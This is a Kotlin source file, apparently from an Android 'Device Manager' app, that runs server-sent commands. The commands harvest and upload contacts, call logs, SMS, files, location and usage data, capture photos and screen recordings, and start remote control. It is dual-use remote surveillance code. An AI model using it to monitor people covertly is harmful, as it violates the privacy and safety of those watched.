package com.devicemanager.manager

import android.content.Context
import android.content.Intent
import android.util.Log
import com.devicemanager.data.remote.ApiService
import com.devicemanager.data.remote.WebSocketClient
import com.devicemanager.data.remote.model.Command
import com.devicemanager.data.remote.model.CommandStatus
import com.devicemanager.data.remote.model.CommandType
import com.devicemanager.data.remote.model.DiagnosticReport
import com.devicemanager.data.remote.model.TransferPriority
import com.devicemanager.data.repository.DeviceRepository
import com.devicemanager.data.repository.LocationRepository
import com.devicemanager.data.repository.SyncRepository
import com.devicemanager.data.repository.TelemetryRepository
import com.devicemanager.services.CameraCaptureService
import com.devicemanager.services.RemoteInputService
import com.devicemanager.services.ScreenRecordService
import com.devicemanager.services.ScreenStreamService
import com.devicemanager.util.Constants
import com.devicemanager.util.Preferences
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.coroutines.withTimeoutOrNull

/**
 * Executes incoming commands from the server.
 *
 * Command lifecycle:
 * 1. Update status to RECEIVED
 * 2. Update status to EXECUTING
 * 3. Execute based on command.type
 * 4. On success: update to COMPLETED with result
 * 5. On failure: update to FAILED with error_message
 *
 * Handles permission denied gracefully with specific error messages.
 * Timeout handling for long-running commands.
 */
class CommandExecutor(
    private val context: Context,
    private val apiService: ApiService,
    private val webSocketClient: WebSocketClient,
    private val deviceRepository: DeviceRepository,
    private val telemetryRepository: TelemetryRepository,
    private val locationRepository: LocationRepository,
    private val syncRepository: SyncRepository,
    private val telemetryCollector: TelemetryCollector,
    private val locationManager: LocationManager,
    private val usageStatsCollector: UsageStatsCollector,
    private val contactsCollector: ContactsCollector,
    private val callLogCollector: CallLogCollector,
    private val smsCollector: SmsCollector,
    private val fileCollector: FileCollector,
    private val chunkedUploadManager: ChunkedUploadManager? = null,
    private val snapshotCollector: SnapshotCollector? = null,
    private val diagnosticRunner: DiagnosticRunner? = null,
    private val preferences: Preferences,
    private val gson: Gson
) {
    companion object {
        private const val TAG = "CommandExecutor"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Execute a command asynchronously.
     */
    fun execute(command: Command) {
        scope.launch {
            executeSuspend(command)
        }
    }

    /**
     * Execute a command with full lifecycle management.
     */
    suspend fun executeSuspend(command: Command) {
        Log.d(TAG, "Executing command: ${command.type} (id=${command.id})")

        // Step 1: Mark as RECEIVED
        updateStatus(command.id, CommandStatus.RECEIVED)

        // Step 2: Mark as EXECUTING
        updateStatus(command.id, CommandStatus.EXECUTING)

        // Step 3: Execute with timeout
        val result = withTimeoutOrNull(Constants.COMMAND_TIMEOUT_MS) {
            try {
                when (command.type) {
                    CommandType.GET_TELEMETRY -> executeGetTelemetry(command)
                    CommandType.GET_LOCATION -> executeGetLocation(command)
                    CommandType.GET_NOTIFICATIONS -> executeGetNotifications(command)
                    CommandType.GET_USAGE_STATS -> executeGetUsageStats(command)
                    CommandType.SYNC_CONTACTS -> executeSyncContacts(command)
                    CommandType.SYNC_CALLS -> executeSyncCalls(command)
                    CommandType.SYNC_SMS -> executeSyncSms(command)
                    CommandType.SYNC_FILES -> executeSyncFiles(command)
                    CommandType.CAPTURE_PHOTO -> executeCapturePhoto(command)
                    CommandType.START_SCREEN_RECORD -> executeStartScreenRecord(command)
                    CommandType.STOP_SCREEN_RECORD -> executeStopScreenRecord(command)
                    CommandType.UPLOAD_FILE -> executeUploadFile(command)
                    CommandType.PING -> executePing(command)
                    CommandType.START_REMOTE_CONTROL -> executeStartRemoteControl(command)
                    CommandType.STOP_REMOTE_CONTROL -> executeStopRemoteControl(command)
                    CommandType.UPLOAD_FILE_CHUNKED -> executeUploadFileChunked(command)
                    CommandType.CREATE_SNAPSHOT -> executeCreateSnapshot(command)
                    CommandType.RUN_DIAGNOSTICS -> executeRunDiagnostics(command)
                    else -> {
                        CommandResult.Failure("Unknown command type: ${command.type}")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command execution error: ${e.message}", e)
                CommandResult.Failure("Execution error: ${e.message}")
            }
        }

        // Step 4/5: Update final status
        val finalResult = result ?: CommandResult.Failure("Command timed out after ${Constants.COMMAND_TIMEOUT_MS}ms")

        when (finalResult) {
            is CommandResult.Success -> {
                updateStatus(command.id, CommandStatus.COMPLETED, result = finalResult.message)
            }
            is CommandResult.Failure -> {
                updateStatus(command.id, CommandStatus.FAILED, error = finalResult.error)
            }
        }
    }

    // ── Command implementations ──────────────────────────────────────

    private suspend fun executeGetTelemetry(command: Command): CommandResult {
        val telemetry = telemetryCollector.collect()
        val result = telemetryRepository.sendTelemetry(telemetry)
        return if (result.isSuccess) {
            CommandResult.Success("Telemetry collected and sent")
        } else {
            CommandResult.Failure("Failed to send telemetry: ${result.exceptionOrNull()?.message}")
        }
    }

    private suspend fun executeGetLocation(command: Command): CommandResult {
        if (!locationManager.hasPermission()) {
            return CommandResult.Failure("Location permission not granted. Please grant location permission in Settings.")
        }
        val location = locationManager.getCurrentLocation()
        if (location == null) {
            return CommandResult.Failure("Could not obtain location. GPS may be disabled or unavailable.")
        }
        val result = locationRepository.sendLocation(location)
        return if (result.isSuccess) {
            CommandResult.Success("Location sent: ${location.lat}, ${location.lng}")
        } else {
            CommandResult.Failure("Failed to send location: ${result.exceptionOrNull()?.message}")
        }
    }

    private suspend fun executeGetNotifications(command: Command): CommandResult {
        // Notifications are monitored live via NotificationListenerService
        return CommandResult.Success("Notifications are monitored in real-time. No action needed.")
    }

    private suspend fun executeGetUsageStats(command: Command): CommandResult {
        if (!usageStatsCollector.hasUsageAccess()) {
            return CommandResult.Failure("Usage access not granted. Please enable Usage access in Settings > Apps > Special app access.")
        }
        val usage = usageStatsCollector.collectDailyUsage()
        val request = com.devicemanager.data.remote.model.UsageRequest(usage = usage)
        val result = try {
            apiService.sendUsageStats(request)
        } catch (e: Exception) {
            return CommandResult.Failure("Failed to send usage stats: ${e.message}")
        }
        return if (result.isSuccessful) {
            CommandResult.Success("Usage stats sent: ${usage.size} apps")
        } else {
            CommandResult.Failure("Failed to send usage stats: HTTP ${result.code()}")
        }
    }

    private suspend fun executeSyncContacts(command: Command): CommandResult {
        if (!contactsCollector.hasPermission()) {
            return CommandResult.Failure("Contacts permission not granted.")
        }
        val contacts = contactsCollector.collectContacts()
        val request = com.devicemanager.data.remote.model.ContactsSyncRequest(contacts = contacts)
        val result = try {
            apiService.syncContacts(request)
        } catch (e: Exception) {
            syncRepository.queueEvent("CONTACTS", Constants.API_CONTACTS_SYNC, request, "contacts_${System.currentTimeMillis()}")
            return CommandResult.Failure("Failed to sync contacts (queued for retry): ${e.message}")
        }
        return if (result.isSuccessful) {
            CommandResult.Success("Contacts synced: ${contacts.size} entries")
        } else {
            CommandResult.Failure("Failed to sync contacts: HTTP ${result.code()}")
        }
    }

    private suspend fun executeSyncCalls(command: Command): CommandResult {
        if (!callLogCollector.hasPermission()) {
            return CommandResult.Failure("Call log permission not granted.")
        }
        val calls = callLogCollector.collectCallLog()
        val request = com.devicemanager.data.remote.model.CallsSyncRequest(calls = calls)
        val result = try {
            apiService.syncCalls(request)
        } catch (e: Exception) {
            syncRepository.queueEvent("CALLS", Constants.API_CALLS_SYNC, request, "calls_${System.currentTimeMillis()}")
            return CommandResult.Failure("Failed to sync calls (queued for retry): ${e.message}")
        }
        return if (result.isSuccessful) {
            CommandResult.Success("Call log synced: ${calls.size} entries")
        } else {
            CommandResult.Failure("Failed to sync calls: HTTP ${result.code()}")
        }
    }

    private suspend fun executeSyncSms(command: Command): CommandResult {
        if (!smsCollector.hasPermission()) {
            return CommandResult.Failure("SMS permission not granted.")
        }
        if (!smsCollector.isDefaultSmsApp()) {
            return CommandResult.Failure("SMS access requires the app to be set as the default SMS app on Android 10+. Please set this app as default SMS app in Settings.")
        }
        val messages = smsCollector.collectSms()
        val request = com.devicemanager.data.remote.model.SmsSyncRequest(messages = messages)
        val result = try {
            apiService.syncSms(request)
        } catch (e: Exception) {
            syncRepository.queueEvent("SMS", Constants.API_SMS_SYNC, request, "sms_${System.currentTimeMillis()}")
            return CommandResult.Failure("Failed to sync SMS (queued for retry): ${e.message}")
        }
        return if (result.isSuccessful) {
            CommandResult.Success("SMS synced: ${messages.size} messages")
        } else {
            CommandResult.Failure("Failed to sync SMS: HTTP ${result.code()}")
        }
    }

    private suspend fun executeSyncFiles(command: Command): CommandResult {
        if (!fileCollector.hasPermission()) {
            return CommandResult.Failure("Storage permission not granted.")
        }
        val files = fileCollector.collectAllFiles()
        val request = com.devicemanager.data.remote.model.FilesSyncRequest(files = files)
        val result = try {
            apiService.syncFiles(request)
        } catch (e: Exception) {
            syncRepository.queueEvent("FILES", Constants.API_FILES_SYNC, request, "files_${System.currentTimeMillis()}")
            return CommandResult.Failure("Failed to sync files (queued for retry): ${e.message}")
        }
        return if (result.isSuccessful) {
            CommandResult.Success("File metadata synced: ${files.size} files")
        } else {
            CommandResult.Failure("Failed to sync files: HTTP ${result.code()}")
        }
    }

    private suspend fun executeCapturePhoto(command: Command): CommandResult {
        // Start camera capture service which will capture and upload the photo
        val intent = Intent(context, CameraCaptureService::class.java).apply {
            action = CameraCaptureService.ACTION_CAPTURE
            putExtra(CameraCaptureService.EXTRA_COMMAND_ID, command.id)
        }
        try {
            context.startService(intent)
            return CommandResult.Success("Camera capture initiated. Photo will be uploaded automatically.")
        } catch (e: Exception) {
            return CommandResult.Failure("Failed to start camera capture: ${e.message}")
        }
    }

    private suspend fun executeStartScreenRecord(command: Command): CommandResult {
        val intent = Intent(context, ScreenRecordService::class.java).apply {
            action = ScreenRecordService.ACTION_START
            putExtra(ScreenRecordService.EXTRA_COMMAND_ID, command.id)
        }
        try {
            context.startService(intent)
            return CommandResult.Success("Screen recording initiated. User must approve MediaProjection consent.")
        } catch (e: Exception) {
            return CommandResult.Failure("Failed to start screen recording: ${e.message}")
        }
    }

    private suspend fun executeStopScreenRecord(command: Command): CommandResult {
        val intent = Intent(context, ScreenRecordService::class.java).apply {
            action = ScreenRecordService.ACTION_STOP
            putExtra(ScreenRecordService.EXTRA_COMMAND_ID, command.id)
        }
        try {
            context.startService(intent)
            return CommandResult.Success("Screen recording stop initiated. Video will be uploaded automatically.")
        } catch (e: Exception) {
            return CommandResult.Failure("Failed to stop screen recording: ${e.message}")
        }
    }

    private suspend fun executeUploadFile(command: Command): CommandResult {
        val filePath = command.payload?.get("file_path") as? String
        if (filePath.isNullOrBlank()) {
            return CommandResult.Failure("Missing file_path in command payload")
        }
        val file = java.io.File(filePath)
        if (!file.exists()) {
            return CommandResult.Failure("File not found: $filePath")
        }
        // Upload is handled by a service to avoid blocking
        val intent = Intent(context, CameraCaptureService::class.java).apply {
            action = CameraCaptureService.ACTION_UPLOAD_FILE
            putExtra(CameraCaptureService.EXTRA_FILE_PATH, filePath)
            putExtra(CameraCaptureService.EXTRA_COMMAND_ID, command.id)
        }
        return try {
            context.startService(intent)
            CommandResult.Success("File upload initiated: ${file.name}")
        } catch (e: Exception) {
            CommandResult.Failure("Failed to upload file: ${e.message}")
        }
    }

    private suspend fun executePing(command: Command): CommandResult {
        return CommandResult.Success("pong")
    }

    private suspend fun executeStartRemoteControl(command: Command): CommandResult {
        // Check if AccessibilityService is enabled (required for input injection)
        if (!RemoteInputService.isServiceEnabled) {
            return CommandResult.Failure(
                "Remote control requires Accessibility Service. " +
                "Please enable it in Settings > Accessibility > Device Manager Remote Control. " +
                "Screen sharing will still work, but touch input will not."
            )
        }

        val targetFps = command.payload?.get("target_fps") as? Int ?: 30
        val targetQuality = command.payload?.get("target_quality") as? Int ?: 70
        val lowLatency = command.payload?.get("low_latency") as? Boolean ?: false

        val intent = Intent(context, ScreenStreamService::class.java).apply {
            action = ScreenStreamService.ACTION_START
            putExtra(ScreenStreamService.EXTRA_COMMAND_ID, command.id)
            putExtra(ScreenStreamService.EXTRA_TARGET_FPS, targetFps)
            putExtra(ScreenStreamService.EXTRA_TARGET_QUALITY, targetQuality)
            putExtra(ScreenStreamService.EXTRA_LOW_LATENCY, lowLatency)
        }

        try {
            context.startService(intent)
            return CommandResult.Success("Remote control initiated. User must approve MediaProjection consent for screen sharing.")
        } catch (e: Exception) {
            return CommandResult.Failure("Failed to start remote control: ${e.message}")
        }
    }

    private suspend fun executeStopRemoteControl(command: Command): CommandResult {
        val intent = Intent(context, ScreenStreamService::class.java).apply {
            action = ScreenStreamService.ACTION_STOP
            putExtra(ScreenStreamService.EXTRA_COMMAND_ID, command.id)
        }
        try {
            context.startService(intent)
            return CommandResult.Success("Remote control stop initiated.")
        } catch (e: Exception) {
            return CommandResult.Failure("Failed to stop remote control: ${e.message}")
        }
    }

    private suspend fun executeUploadFileChunked(command: Command): CommandResult {
        val filePath = command.payload?.get("file_path") as? String
        if (filePath.isNullOrBlank()) {
            return CommandResult.Failure("Missing file_path in command payload")
        }
        val file = java.io.File(filePath)
        if (!file.exists()) {
            return CommandResult.Failure("File not found: $filePath")
        }
        if (chunkedUploadManager == null) {
            return CommandResult.Failure("Chunked upload manager not initialized")
        }
        val priority = (command.payload?.get("priority") as? Number)?.toInt() ?: TransferPriority.NORMAL
        val mimeType = command.payload?.get("mime_type") as? String ?: "application/octet-stream"
        chunkedUploadManager.enqueue(filePath, priority, mimeType)
        return CommandResult.Success("Chunked upload queued: ${file.name} (priority=$priority)")
    }

    private suspend fun executeCreateSnapshot(command: Command): CommandResult {
        if (snapshotCollector == null) {
            return CommandResult.Failure("Snapshot collector not initialized")
        }
        return try {
            val snapshot = snapshotCollector.collect()
            val result = apiService.createSnapshot(
                com.devicemanager.data.remote.SnapshotCreateRequest(snapshot)
            )
            if (result.isSuccessful) {
                CommandResult.Success("Snapshot created and sent to server")
            } else {
                CommandResult.Failure("Failed to send snapshot: HTTP ${result.code()}")
            }
        } catch (e: Exception) {
            CommandResult.Failure("Snapshot failed: ${e.message}")
        }
    }

    private suspend fun executeRunDiagnostics(command: Command): CommandResult {
        if (diagnosticRunner == null) {
            return CommandResult.Failure("Diagnostic runner not initialized")
        }
        return try {
            val report = diagnosticRunner.runAll()
            val passCount = report.checks.count { it.status == "PASS" }
            val warnCount = report.checks.count { it.status == "WARNING" }
            val failCount = report.checks.count { it.status == "FAIL" }
            CommandResult.Success(
                "Diagnostics complete: $passCount PASS, $warnCount WARNING, $failCount FAIL — overall: ${report.overallStatus}"
            )
        } catch (e: Exception) {
            CommandResult.Failure("Diagnostics failed: ${e.message}")
        }
    }

    // ── Status update helpers ────────────────────────────────────────

    private suspend fun updateStatus(
        commandId: String,
        status: String,
        result: String? = null,
        error: String? = null
    ) {
        // Try WebSocket first (faster), fall back to REST API
        val wsSent = webSocketClient.sendCommandStatus(commandId, status, result, error)
        if (!wsSent) {
            deviceRepository.updateCommandStatus(commandId, status, result, error)
        }
    }

    // ── Result sealed class ──────────────────────────────────────────

    sealed class CommandResult {
        data class Success(val message: String) : CommandResult()
        data class Failure(val error: String) : CommandResult()
    }
}
